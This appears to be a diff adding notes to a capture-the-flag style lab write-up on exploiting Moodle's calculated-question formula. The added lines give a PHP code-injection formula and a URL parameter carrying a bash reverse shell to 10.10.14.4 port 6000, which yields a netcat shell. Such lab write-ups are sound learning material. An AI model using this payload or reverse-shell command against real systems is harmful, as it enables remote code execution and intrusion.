@@ -83,3 +83,13 @@ Kind regards,
 Giovanni
 ```
 
+Took a while to repro this part, but finally, the formula worked for /*{a*/`$_REQUEST[rad]`;//{x}}
+
+and then in the URL:
+http://10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7
+
+added the parameter:
+&rad=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.4/6000+0>%261'
+
+Got a nc shell.
+
